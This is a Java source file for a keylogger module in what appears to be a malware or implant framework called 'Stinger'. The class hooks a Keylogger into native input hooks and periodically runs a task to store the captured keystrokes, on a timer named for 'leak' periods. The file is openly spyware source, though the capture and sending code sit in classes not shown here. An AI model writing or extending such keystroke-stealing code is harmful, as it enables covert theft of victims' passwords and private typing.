package stinger.os.keylogger;

import stinger.Constants;
import stinger.PeriodicTaskModule;
import stinger.StingerEnvironment;

import java.util.concurrent.ExecutorService;

public class KeyloggerModule extends PeriodicTaskModule {

    private Keylogger mKeylogger;

    public KeyloggerModule(ExecutorService executorService) {
        super("KeyloggerModule", executorService, Constants.KEYLOGGER_LEAK_PERIOD_MS);
        mKeylogger = null;
    }

    @Override
    public synchronized void start(StingerEnvironment environment) {
        if (mKeylogger == null) {
            mKeylogger = new Keylogger(environment);
        }

        super.start(environment);

        if (isRunning()) {
            environment.getModules().getNativeHooks().start(environment);
            environment.getModules().getNativeHooks().register(mKeylogger);
        }
    }

    @Override
    public synchronized void stop(StingerEnvironment environment) {
        super.stop(environment);

        if (!isRunning() && mKeylogger != null) {
            environment.getModules().getNativeHooks().unregister(mKeylogger);
        }
    }

    @Override
    protected Runnable createTask(StingerEnvironment environment) {
        return new KeyloggerStoreTask(mKeylogger, environment);
    }

}
